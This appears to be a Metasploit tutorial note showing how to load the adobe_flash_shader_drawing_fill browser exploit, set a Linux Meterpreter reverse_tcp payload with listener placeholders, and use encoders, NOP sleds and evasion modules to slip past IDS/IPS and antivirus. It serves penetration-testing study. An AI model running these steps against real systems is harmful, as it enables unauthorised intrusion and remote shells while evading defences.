# Metasploit Exploit Commands

This section focuses on once an exploit is selected. Once an exploit is activated, and we are in context mode, we can use `show options` to display specific parameters.
Lets demonstrate with an `adobe_flash_shader_drawing_fill` exploit. 

```bash
use exploit/multi/browser/adobe_flash_shader_drawing_fill
show options
set SRVHOST
set SRVPORT
```

### Show targets

In exploit context mode, allows us to see what targets are available - we can see using the previous exploit, both Windows and Linux are susceptible. We choose one:

```bash
# Choose the Linux target
set target 1
# The display will then show the Linux only payloads
show payloads
# Set Payload - runs a basic command
set payload linux/x86/exec
# Or we can get a reverse shell Meterpreter payload
set payload linux/x86/meterpreter/reverse_tcp
set lhost [your listening ip]
set lport [listening port]

# Can set global parameters
setg LHOST [ip]
save
```

### Staged vs Non-Staged

Non-staged payloads are sent to the target all at once.
Staged payloads are sent in parts / stages. In some occasions, staged is the best choice, such as when the buffer size isn't large enough, or to avoid the antivirus detecting shellcode in a payload. 

### Show Advanced

In exploit context, AND when a payload has been set, `show advanced` will show advanced options for that payload.
`set disablepayloadhandler true` - allows us to set a modified advanced payload parameter.

### Show encoders

`show encoders` allow you to see a list of available / compatible encoders, which can be used to avoid and evade IDS/IPS signatures. 

### Show nops

`show nops` returns a list of NOP generators, which is used to create a NOP sled to bypass IDS/IPS signatures. 
To select a NOP generator, `set x64/simple` for example. 

### Show evasion

`show evasion` shows a list of available evasion techniques. 

### Executing exploits

Just two commands, and they both do the same thing - 
`run` and `exploit`.
